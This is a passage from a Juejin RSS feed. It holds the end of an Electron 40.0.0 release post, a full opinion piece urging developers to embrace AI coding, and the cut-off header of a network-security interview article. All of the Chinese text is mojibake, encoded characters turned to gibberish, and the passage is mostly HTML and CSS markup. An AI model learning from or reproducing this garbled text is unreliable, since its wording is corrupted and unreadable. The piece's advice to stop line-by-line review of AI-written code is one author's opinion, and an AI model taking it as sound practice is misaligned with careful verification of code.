<p>æ›´å¤šå…³äºæœªæ¥å˜æ›´çš„ä¿¡æ¯å¯ä»¥åœ¨ Planned Breaking Changes é¡µé¢æ‰¾åˆ°ã€‚</p>
<h2 data-id="heading-21">å®‰è£…å’Œä½¿ç”¨</h2>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®‰è£… Electron 40.0.0ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install electron@latest
</code></pre>
<p>æˆ–è€…ä» Electron å‘å¸ƒç½‘ç«™ä¸‹è½½ã€‚</p>
<p>Electron 40.0.0 çš„å‘å¸ƒæ ‡å¿—ç€ Electron ç”Ÿæ€ç³»ç»Ÿçš„åˆä¸€æ¬¡é‡è¦è¿›æ­¥ã€‚é€šè¿‡å‡çº§æ ¸å¿ƒæŠ€æœ¯æ ˆå’Œå¼•å…¥æ–°åŠŸèƒ½ï¼ŒElectron ç»§ç»­ä¸ºè·¨å¹³å°æ¡Œé¢åº”ç”¨å¼€å‘æä¾›å¼ºå¤§çš„æ”¯æŒã€‚è™½ç„¶ç‰ˆæœ¬è¿­ä»£é€Ÿåº¦è¾ƒå¿«å¯èƒ½ä¼šç»™å¼€å‘è€…å¸¦æ¥ä¸€äº›å‹åŠ›ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€èƒ½å¤Ÿæ›´å¿«åœ°è·å¾—æœ€æ–°çš„æŠ€æœ¯å’Œå®‰å…¨æ›´æ–°ã€‚å¼€å‘è€…åº”è¯¥å…³æ³¨è¿™äº›æ›´æ–°ï¼Œç‰¹åˆ«æ˜¯ç ´åæ€§å˜æ›´ï¼Œä»¥ç¡®ä¿åº”ç”¨çš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚</p>
<p>å¯¹äºåˆšåˆšç†Ÿæ‚‰ Electron 39 ç‰ˆæœ¬çš„å¼€å‘è€…æ¥è¯´ï¼Œ40 ç‰ˆæœ¬çš„å‘å¸ƒæä¾›äº†ä¸€ä¸ªå¾ˆå¥½çš„æœºä¼šæ¥è¯„ä¼°æ˜¯å¦éœ€è¦å‡çº§ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨æ–°ç‰ˆæœ¬çš„åŠŸèƒ½æ¥æ”¹è¿›åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ä»å¤æ³•ç¼–ç¨‹åˆ° AI Codingã€‘è·³å‡ºæ‰‹å†™ä»£ç çš„é™·é˜±]]></title>    <link>https://juejin.cn/post/7596991930985578547</link>    <guid>https://juejin.cn/post/7596991930985578547</guid>    <pubDate>2026-01-20T08:52:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596991930985578547" data-draft-id="7596698363963277350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ä»å¤æ³•ç¼–ç¨‹åˆ° AI Codingã€‘è·³å‡ºæ‰‹å†™ä»£ç çš„é™·é˜±"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½,Trae"/> <meta itemprop="datePublished" content="2026-01-20T08:52:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="pany"/> <meta itemprop="url" content="https://juejin.cn/user/2041120304148845"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ä»å¤æ³•ç¼–ç¨‹åˆ° AI Codingã€‘è·³å‡ºæ‰‹å†™ä»£ç çš„é™·é˜±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2041120304148845/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    pany
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T08:52:08.000Z" title="Tue Jan 20 2026 08:52:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    179
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç®€ä»‹ï¼šAI Coding è¿‡ç¨‹ä¸­æ²‰æ·€çš„çŸ¥è¯†ã€æŠ€å·§å’Œæ„Ÿæ‚Ÿå½¢æˆçš„é›¶åŸºç¡€æ‰‹æ‘¸æ‰‹æ•™ç¨‹</p>
<p>ä½œè€…ï¼špany</p>
</blockquote>
<h2 data-id="heading-0">å…³äºæœ¬ä¸“æ </h2>
<p><a href="https://juejin.cn/column/7596687515030192154" target="_blank" title="https://juejin.cn/column/7596687515030192154">ä»å¤æ³•ç¼–ç¨‹åˆ° AI Coding</a> ä¸“æ å°†ç”¨çœŸå®çš„å¼€æºé¡¹ç›®å®è·µæ¼”ç¤ºï¼Œæ¸è¿›å¼çš„å¸¦ä½ çš„å…¥é—¨ AI Codingï¼Œä»ç¼–ç¨‹æ€ç»´çš„è½¬å˜ã€åˆ° AI è¾…åŠ©ç¼–ç¨‹ã€å†åˆ° AI ç»“å¯¹ç¼–ç¨‹ã€æœ€ååˆ° Vibe / Spec ç¼–ç¨‹ï¼Œå¹¶ä¸”ä¸­é—´ä¹Ÿä¼šç©¿æ’ç€å„ç§æ–°å·¥å…·çš„ä»‹ç»ä¸ä½¿ç”¨ï¼</p>
<h2 data-id="heading-1">ä¸æƒ³è´©å–ç„¦è™‘ï¼Œä½†...</h2>
<p>æ²¡é”™ï¼Œæ‰‹å†™ä»£ç çš„æ—¶ä»£å·²ç»ç»“æŸäº†ï¼Œæˆ–è€…è¯´æ­£åœ¨ç»“æŸä¸­ï¼Œæˆ‘ä»¬å¿…é¡»è½¬å˜ç¼–ç¨‹æ€ç»´ï¼Œè·³å‡ºæ‰‹å†™ä»£ç çš„é™·é˜±...</p>
<p>è¿™å¬ä¸Šå»ä¼¼ä¹éå¸¸æ‚²è§‚ï¼Œæ¯•ç«Ÿå¯¹ä¼ ç»Ÿå¼€å‘è€…è€Œè¨€ï¼Œèˆ’é€‚åŒºæ­£åœ¨ç“¦è§£ã€‚ä½†<strong>ä¸å…¶åœ¨æ—§æ—¶ä»£çš„æ®‹ä½™ä¸­ç„¦è™‘ï¼Œä¸å¦‚ä¸»åŠ¨æ‹¥æŠ± AI</strong>ï¼Œåœ¨è¿™ä¸ªæŠ€æœ¯èŒƒå¼è½¬ç§»çš„æ—¶åˆ»ï¼Œæ‰¾åˆ°è‡ªå·±æ–°çš„ç”Ÿæ€ä½ï¼Œé¿å…è¢«æ—¶ä»£æŠ›å¼ƒã€‚</p>
<h2 data-id="heading-2">æ€æƒ³é’¢å°</h2>
<p>ä½œä¸ºè¿™ä¸ªä¸“æ çš„å¼€ç¯‡æ–‡ç« ï¼Œæˆ‘æœ‰æƒ³è¿‡ç›´æˆªäº†å½“çš„å°†è‡ªå·±çš„ AI IDE å®è·µåˆ†äº«å‡ºæ¥ï¼Œæˆ–æ˜¯æ”¶é›†åˆ°çš„å„ç§ AI Coding çš„æœ€æ–°èµ„è®¯ã€‚ä½†æ˜¯æ€æ¥æƒ³å»ï¼Œæˆ‘è¿˜æ˜¯å†³å®šå…ˆå°è¯•é€šè¿‡è¿™ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œç»™æˆ‘è‡ªå·±å’Œä½œä¸ºè¯»è€…çš„ä½ æ‰“ä¸Šä¸€ä¸ªæ€æƒ³é’¢å° <strong>ã€Œæ‹¥æŠ± AIã€</strong></p>
<h2 data-id="heading-3">æ›´é«˜ç»´çš„æŠ½è±¡</h2>
<p>æ•´ä¸ªè½¯ä»¶å·¥ç¨‹å†å²ï¼Œå°±æ˜¯ä¸€ä¸ªä¸æ–­å¾€æ›´é«˜ç»´æŠ½è±¡çš„è¿‡ç¨‹ï¼Œç¦»æœºå™¨è¶Šæ¥è¶Šè¿œï¼Œç¦»ä¸šåŠ¡é€»è¾‘ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰è¶Šæ¥è¶Šè¿‘ã€‚</p>
<h3 data-id="heading-4">IDE çš„å‘å±•å†å²</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4248d879242d46c18a1c4828954322ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=eebIgZO640YJRv0bptvyPQ5ckTY%3D" alt="image.png" loading="lazy"/></p>
<p>IDE çš„å‘å±•å¤§è‡´ç»å†ä¸ºä¸€ä»£æ–‡æœ¬ç¼–è¾‘å™¨/å‘½ä»¤è¡Œï¼ŒäºŒä»£ Vimï¼Œä¸‰ä»£ VSCodeï¼Œè¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹ã€‚</p>
<p>è¿™ä¸ªæ¼”è¿›è¿‡ç¨‹æœ‰ä¸€ä¸ªæ˜¾è‘—ç‰¹å¾ï¼Œå°±æ˜¯ IDE æ‰¿è½½çš„è„æ´»ç´¯æ´»è¶Šæ¥è¶Šå¤šï¼Œè€Œç•™ç»™äººç±»çš„åªå‰©ä¸‹æ ¸å¿ƒå†³ç­–ã€‚</p>
<p>æŒ‰ç…§è¿™ä¸ªé€»è¾‘ï¼Œå°† AI IDE åˆ’åˆ†ä¸ºç¬¬å››ä»£ç®€ç›´ä¸è¦å¤ªå®Œç¾ï¼Œå®ƒä¸å†ä»…ä»…æ˜¯æç¤ºä½ æ€ä¹ˆå†™ï¼Œè€Œæ˜¯ç›´æ¥å¸®ä½ å®¡æŸ¥ã€ç¼–å†™ç”šè‡³åˆå§‹åŒ–å·¥ç¨‹ã€‚<strong>å®ƒç”šè‡³ä¸å†æ˜¯ä¸€ä¸ªä¼ ç»Ÿçš„å·¥å…·ï¼Œå®ƒåœ¨è¿™ä¸€åˆ»è½¬å˜ä¸ºäº†ä¸€ä¸ªä¼™ä¼´ï¼Œä¸€ä¸ªç»“å¯¹ç¼–ç¨‹å¯¹è±¡æˆ–æ˜¯ä¸€åªèªæ˜çš„å°é»„é¸­ã€‚</strong></p>
<p>å¹¶ä¸”éšç€ AI çš„æ„ˆå‘å¼ºå¤§ï¼Œå°†æ¥æ‰€è°“çš„ IDE éƒ½å°†ä¸å¤å­˜åœ¨ï¼Œç•™ç»™å¤§å®¶çš„å¯èƒ½åªæœ‰ä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå°±åƒ TRAE SOLO æ¨¡å¼ä¸€æ ·ï¼Œå·²ç»åœ¨å°½å¯èƒ½å‡å°‘ä»£ç çš„æ›å…‰äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/431c8ce52e0e4694a05b2345e896f6f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=3W%2FvgUnTBAF7UWoY%2B1YVa5J8xDM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">ç¼–ç¨‹è¯­è¨€çš„å‘å±•å†å²</h3>
<p>åŒæ ·çš„ï¼Œç¼–ç¨‹è¯­è¨€çš„æ¼”å˜ä¹Ÿæ˜¯ä¸€éƒ¨<strong>é€ƒç¦»åº•å±‚ï¼Œå›å½’è‡ªç„¶è¯­è¨€</strong>çš„è¿›åŒ–å²ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bc40f5e07ce42708ee444427880e17d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=M1QCXped6pQEfP4RCN1eL8xRUIk%3D" alt="image.png" loading="lazy"/></p>
<p>ä»æœ€åˆæ™¦æ¶©éš¾æ‡‚çš„ <strong>0101 æœºå™¨ç </strong>ï¼Œåˆ°éœ€è¦è®°å¿†ç¹çæŒ‡ä»¤çš„<strong>æ±‡ç¼–è¯­è¨€</strong>ï¼Œå†åˆ°åæ¥è´´è¿‘äººç±»é€»è¾‘çš„<strong>é«˜çº§è¯­è¨€</strong>ï¼ˆå¦‚ C/C++ã€Javaã€Pythonã€JavaScriptï¼‰ã€‚æ¯ä¸€ä»£è¯­è¨€çš„è¿­ä»£ï¼Œéƒ½æ˜¯åœ¨è¯•å›¾å±è”½åº•å±‚çš„å¤æ‚åº¦ï¼Œè®©æˆ‘ä»¬æ›´ä¸“æ³¨äºæˆ‘è¦åšä»€ä¹ˆï¼Œè€Œä¸æ˜¯ç”µè„‘è¯¥æ€ä¹ˆåŠ¨ã€‚</p>
<p>è€Œåˆ°äº† AI Coding æ—¶ä»£ï¼Œç¼–ç¨‹è¯­è¨€è¿æ¥äº†ç»ˆæçš„æŠ½è±¡ <strong>ã€Œè‡ªç„¶è¯­è¨€ Natural Languageã€</strong></p>
<p>æˆ‘ä»¬ä¸å†éœ€è¦çº ç»“äºè¯­æ³•ç³–ã€åˆ†å·æ˜¯ä¸æ˜¯æ¼å†™äº†ï¼Œæˆ–è€…æ˜¯ API çš„å…·ä½“å‚æ•°æ˜¯ä»€ä¹ˆã€‚<strong>Prompt å³ä»£ç ï¼Œæ„å›¾å³å®ç°ã€‚</strong> è¿™ç§ç»´åº¦çš„æå‡æ˜¯é™ç»´æ‰“å‡»å¼çš„ï¼Œå®ƒå°†ç¼–ç¨‹çš„é—¨æ§›å½»åº•æŠ¹å¹³ï¼Œè®©å¼€å‘è¿™ä»¶äº‹å›å½’åˆ°äº†æœ€çº¯ç²¹çš„é€»è¾‘æ„å»ºä¸åˆ›é€ åŠ›æœ¬èº«ã€‚</p>
<h2 data-id="heading-6">æ€ç»´çš„è½¬å˜</h2>
<p>å¦‚æœè¯´ AI æ˜¯ä¸€è‚¡ä¸å¯é˜»æŒ¡çš„æµªæ½®ï¼Œé‚£ä¹ˆæˆ‘è§‰å¾—ç¬¬ä¸€ä»¶äº‹å°±æ˜¯è½¬å˜æ€ç»´æ‹¥æŠ±å®ƒã€‚ä½†æ˜¯åˆšå¼€å§‹ä½¿ç”¨å®ƒçš„æ—¶å€™å¯èƒ½ä¼šè¿›å…¥ä¸€ä¸ªé™·é˜±ï¼Œé‚£å°±æ˜¯ <strong>ã€Œå¤ªåœ¨æ„å®ƒå†™çš„ä»£ç ã€</strong></p>
<p>æˆ‘å°±è½å…¥äº†è¿™ä¸ªé™·é˜±ã€‚</p>
<p>æˆ‘è¿‡åº¦çš„åœ¨æ„äº†å®ƒå†™ä»£ç çš„å®Œç¾æ€§ï¼Œç”šè‡³ä¼šåœ¨æ„å®ƒæœ‰æ²¡æœ‰æŒ‰ç…§æˆ‘çš„æƒ³æ³•æ¥å†™ä»£ç ã€‚<strong>ä¸€æ—¦å®ƒç”Ÿæˆçš„ä»£ç ä¸å®Œç¾ï¼Œæˆ‘å°±ä¼šé™·å…¥ "æ”¹å®ƒä¸å¦‚è‡ªå·±å†™" çš„ç„¦èºä¸­</strong>ï¼Œå°±æ˜¯è¿™æ ·å¯¼è‡´æˆ‘æ‹¥æŠ±å®ƒæ‹¥æŠ±çš„ä¸å¤ŸåŠæ—¶ã€‚</p>
<p>è€Œè®©æˆ‘è·³å‡ºè¿™ä¸ªé™·é˜±çš„å¥‘æœºå°±æ˜¯ä¸€ä¸ªæ€ç»´çš„è½¬å˜ï¼Œ<strong>ä»å…³æ³¨ã€Œä»£ç ã€è½¬å˜ä¸ºå…³æ³¨ã€Œäº¤ä»˜æ•ˆç‡ã€</strong>ã€‚</p>
<p>å¯¹ï¼Œæ ¸å¿ƒæ˜¯ <strong>ã€Œæ•ˆç‡ã€</strong></p>
<p>åªè¦ AI å†™ä»£ç èƒ½å¸®æˆ‘æé«˜æ•ˆç‡ï¼Œæˆ‘ä¼šå…è®¸è‡ªå·±å¿½ç•¥æ‰ä¸€äº›å®ƒçš„ä¸è¶³ã€‚å¹¶ä¸”ä¸€æ—¦æ€ç»´è½¬å˜æˆåŠŸï¼Œåç»­æ‰€æœ‰çš„ AI Coding è¿‡ç¨‹éƒ½é»˜é»˜å˜å¾—é¡ºç•…äº†èµ·æ¥ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>ä¸å†é€è¡Œ Code Reviewï¼Œè€Œæ˜¯å®¡æŸ¥æ•´ä½“ç»“æ„</li>
<li>ä¸å†è¿‡åº¦çº ç»“å®ç°ç»†èŠ‚ï¼Œè€Œæ˜¯æ ¡éªŒé€»è¾‘æ˜¯å¦åˆç†</li>
<li>ä¸å†é‡ç‚¹å…³æ³¨ç¬¦ä¸ç¬¦åˆæˆ‘çš„æƒ³æ³•ï¼Œè€Œæ˜¯å…³æ³¨æœ‰æ²¡æœ‰å®ç°éœ€æ±‚</li>
</ul>
<p>è¿™æ—¶å€™ä¼šè‡ªç„¶è€Œç„¶çš„è¿›å…¥ç»ˆæé˜¶æ®µï¼Œé‚£å°±æ˜¯ <strong>ã€Œä¿¡ä»»ã€</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb39890b840c415897ca27f7e6c735b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcGFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769569029&amp;x-signature=H6s8L%2F9uiqR70zinKptnkfa2EPk%3D" alt="image.png" loading="lazy"/></p>
<p>ä¿¡ä»» AI å¹¶ä¸ä»£è¡¨ AI ä¸ä¼šçŠ¯é”™ï¼Œå®ƒå°±åƒä¸€ä¸ªé è°±çš„å‘˜å·¥ä¸€æ ·ï¼Œå€¼å¾—é¢†å¯¼å°†é‡è¦çš„äº‹æƒ…äº¤ä»˜ç»™ä»–ï¼Œè€Œé¢†å¯¼åªéœ€è¦ç­‰å¾…ç»“æœå³å¯ã€‚</p>
<h2 data-id="heading-7">ç»“è¯­</h2>
<p>è·³å‡ºé™·é˜±ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†æ•ˆç‡ï¼Œæ›´æ˜¯ä¸ºäº†ç»™è‡ªå·±æ‹¿åˆ°ä¸€å¼ é€šå¾€æœªæ¥çš„å…¥åœºåˆ¸ã€‚</p>
<p><strong>è¿™ä¸€æ¬¡ï¼Œè®©æˆ‘ä»¬æ¢ä¸ªå§¿åŠ¿ï¼Œç»§ç»­ç¼–ç æœªæ¥ã€‚</strong></p>
<h2 data-id="heading-8">å…³æ³¨</h2>
<p>åŠæ—¶è·å–åç»­çš„æ–‡ç« æ›´æ–° ğŸ‘‡ğŸ»</p>
<ul>
<li>å…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzE5MTYyOTQxNQ%3D%3D%26action%3Dgetalbum%26album_id%3D4350407594377658379%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzE5MTYyOTQxNQ==&amp;action=getalbum&amp;album_id=4350407594377658379#wechat_redirect" ref="nofollow noopener noreferrer">å‰å¾€åˆé›†</a> æˆ–å…³æ³¨ä½œè€… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fuser-attachments%2Fassets%2F529bac73-f9e3-4311-94d0-3db57216b771" target="_blank" title="https://github.com/user-attachments/assets/529bac73-f9e3-4311-94d0-3db57216b771" ref="nofollow noopener noreferrer">PanyCoding</a></li>
<li>æ˜é‡‘ï¼š<a href="https://juejin.cn/column/7596687515030192154" target="_blank" title="https://juejin.cn/column/7596687515030192154">å‰å¾€ä¸“æ </a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´"å¯†ç è¦è®¾å¤æ‚ç‚¹"äº†]]></title>    <link>https://juejin.cn/post/7597270795212013608</link>    <guid>https://juejin.cn/post/7597270795212013608</guid>    <pubDate>2026-01-20T12:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795212013608" data-draft-id="7587277503946850304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´&quot;å¯†ç è¦è®¾å¤æ‚ç‚¹&quot;äº†"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-20T12:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜é—®ç½‘ç»œå®‰å…¨ï¼Œåˆ«å†è¯´"å¯†ç è¦è®¾å¤æ‚ç‚¹"äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:13:07.000Z" title="Tue Jan 20 2026 12:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
